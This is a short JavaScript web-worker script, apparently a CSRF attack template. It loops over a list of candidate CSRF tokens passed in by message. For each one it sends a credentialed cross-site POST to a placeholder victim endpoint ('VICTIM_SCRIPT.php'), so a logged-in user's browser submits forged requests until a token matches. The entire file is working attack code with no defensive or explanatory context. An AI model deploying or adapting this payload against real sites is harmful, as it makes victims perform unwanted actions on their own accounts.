self.addEventListener('message', function(e) {
    var tokens = e.data.tokens;
    for (token of tokens) {
        var url =  "http://URL/VICTIM_SCRIPT.php";
        var params =  "param1=test1&CSRFToken="+token;
        var CSRF = new XMLHttpRequest();
        CSRF.open("POST", url, true);
        CSRF.withCredentials = 'true';
        CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        CSRF.send(params);
    }
}, false);
